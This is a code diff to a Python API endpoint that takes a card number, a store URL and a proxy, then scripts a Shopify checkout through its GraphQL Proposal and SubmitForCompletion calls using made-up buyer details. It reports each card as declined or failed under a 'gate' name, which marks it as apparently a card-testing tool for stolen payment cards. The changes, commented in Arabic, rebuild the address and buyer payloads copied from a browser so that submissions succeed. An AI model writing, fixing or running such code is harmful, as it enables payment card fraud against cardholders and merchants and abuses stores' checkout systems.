@@ -21,7 +21,7 @@ def format_proxy(proxy_str):
     elif len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
     return f"http://{proxy_str}"
 
-def safe_response(msg, raw_data, price, gate="Python X-Ray Final"):
+def safe_response(msg, raw_data, price, gate="Python X-Ray Perfect"):
     raw_clean = str(raw_data).replace('\n', ' ').replace('\r', '').replace('  ', '')[:70] if raw_data else "No Raw Data"
     final_msg = f"{msg} | RAW: {raw_clean}" if "Failed" in msg or "Error" in msg or "Declined" in msg else msg
     clean_price = str(price).replace('$', '').strip() if price else "-"
@@ -126,20 +126,22 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             card_session_id = res_pci.json().get("id")
 
             # =========================================================
-            # المطابقة الحرفية للـ Payload من صورتك 
+            # بناء القالب المطابق 100% للكود اللي أنت سحبته
             # =========================================================
-            exact_address_payload = {
+            flat_address = {
                 "address1": buyer["address1"],
-                "address2": "", # كما في الصورة
+                "address2": "",
                 "city": buyer["city"],
                 "countryCode": buyer["country"],
+                "postalCode": buyer["zip"],
                 "firstName": buyer["first_name"],
                 "lastName": buyer["last_name"],
-                "oneTimeUse": False, # المتغير السري الذي كشفته صورتك
-                "phone": buyer["phone"],
-                "postalCode": buyer["zip"],
-                "zoneCode": buyer["province"]
+                "zoneCode": buyer["province"],
+                "phone": buyer["phone"]
             }
+            
+            partial_address = flat_address.copy()
+            partial_address["oneTimeUse"] = False # المتغير الإجباري الجديد
 
             gql_url = f"{store_url}/checkouts/unstable/graphql?operationName=Proposal"
             gql_headers = {
@@ -149,39 +151,87 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             merch_id = str(uuid.uuid4())
             
             prop_query = """query Proposal($delivery:DeliveryTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$sessionInput:SessionTokenInput!){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity}}){result{...on NegotiationResultAvailable{queueToken}}}}}"""
+            
+            # الهيكل المنسوخ من المتصفح بالمللي
             prop_vars = {
+                "sessionInput": {
+                    "sessionToken": session_token
+                },
                 "delivery": {
-                    "deliveryLines": [{
-                        "destination": {
-                            "partialStreetAddress": exact_address_payload # التركيبة المطابقة لصورتك
-                        },
-                        "deliveryMethodTypes": ["SHIPPING"],
-                        "destinationChanged": False, # تم التصحيح بناءً على الصورة
-                        "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": "any", "customDeliveryRate": False}},
-                        "expectedTotalPrice": {"any": True}
-                    }],
+                    "deliveryLines": [
+                        {
+                            "destination": {
+                                "partialStreetAddress": partial_address
+                            },
+                            "selectedDeliveryStrategy": {
+                                "deliveryStrategyByHandle": {
+                                    "handle": "any",
+                                    "customDeliveryRate": False
+                                },
+                                "options": {}
+                            },
+                            "targetMerchandiseLines": {
+                                "lines": [{"stableId": merch_id}]
+                            },
+                            "deliveryMethodTypes": ["SHIPPING"],
+                            "expectedTotalPrice": {
+                                "any": True
+                            },
+                            "destinationChanged": False
+                        }
+                    ],
+                    "noDeliveryRequired": [],
+                    "useProgressiveRates": False,
+                    "prefetchShippingRatesStrategy": None,
                     "supportsSplitShipping": True
                 },
                 "payment": {
-                    "totalAmount": {"any": True},
+                    "totalAmount": {
+                        "any": True
+                    },
                     "paymentLines": [],
-                    "billingAddress": exact_address_payload
+                    "billingAddress": {
+                        "streetAddress": flat_address
+                    }
                 },
                 "merchandise": {
-                    "merchandiseLines": [{
-                        "stableId": merch_id,
-                        "merchandise": {
-                            "productVariantReference": {
-                                "id": f"gid://shopify/ProductVariantMerchandise/{variant_id}",
-                                "variantId": f"gid://shopify/ProductVariant/{variant_id}"
-                            }
-                        },
-                        "quantity": {"items": {"value": 1}},
-                        "expectedTotalPrice": {"any": True}
-                    }]
+                    "merchandiseLines": [
+                        {
+                            "stableId": merch_id,
+                            "merchandise": {
+                                "productVariantReference": {
+                                    "id": f"gid://shopify/ProductVariantMerchandise/{variant_id}",
+                                    "variantId": f"gid://shopify/ProductVariant/{variant_id}",
+                                    "properties": [],
+                                    "sellingPlanId": None,
+                                    "sellingPlanDigest": None
+                                }
+                            },
+                            "quantity": {
+                                "items": {
+                                    "value": 1
+                                }
+                            },
+                            "expectedTotalPrice": {
+                                "any": True
+                            },
+                            "lineComponentsSource": None,
+                            "lineComponents": []
+                        }
+                    ]
                 },
-                "buyerIdentity": {"customer": {"presentmentCurrency": "USD", "countryCode": "US"}, "email": buyer["email"]},
-                "sessionInput": {"sessionToken": session_token}
+                "buyerIdentity": {
+                    "customer": {
+                        "presentmentCurrency": "USD",
+                        "countryCode": "US"
+                    },
+                    "email": buyer["email"],
+                    "emailChanged": False,
+                    "phoneCountryCode": "US",
+                    "marketingConsent": [],
+                    "shopPayOptInPhone": None,
+                    "rememberMe": False
+                }
             }
             
             res_prop = session.post(gql_url, json={"operationName": "Proposal", "query": prop_query, "variables": prop_vars}, headers=gql_headers)
@@ -193,6 +243,7 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
 
             sub_url = f"{store_url}/checkouts/unstable/graphql?operationName=SubmitForCompletion"
             sub_query = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!){submitForCompletion(input:$input attemptToken:$attemptToken){...on SubmitSuccess{receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id}}}...on SubmitAlreadyAccepted{receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id}}}...on SubmitRejected{errors{code localizedMessage}}...on SubmittedForCompletion{receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id}}}}}"""
+            
             sub_vars = {
                 "attemptToken": f"{checkout_token}-{uuid.uuid4().hex[:10]}",
                 "input": {
@@ -207,14 +258,14 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                                 "directPaymentMethod": {
                                     "paymentMethodIdentifier": "bfe4013b52b37df95b64c063a41da319",
                                     "sessionId": card_session_id,
-                                    "billingAddress": {"streetAddress": exact_address_payload}
+                                    "billingAddress": {"streetAddress": flat_address}
                                 }
                             },
                             "amount": {"any": True}
                         }],
-                        "billingAddress": {"streetAddress": exact_address_payload}
+                        "billingAddress": {"streetAddress": flat_address}
                     },
-                    "buyerIdentity": {"customer": {"presentmentCurrency": "USD", "countryCode": "US"}, "email": buyer["email"], "phoneCountryCode": "US"}
+                    "buyerIdentity": prop_vars["buyerIdentity"]
                 }
             }
             
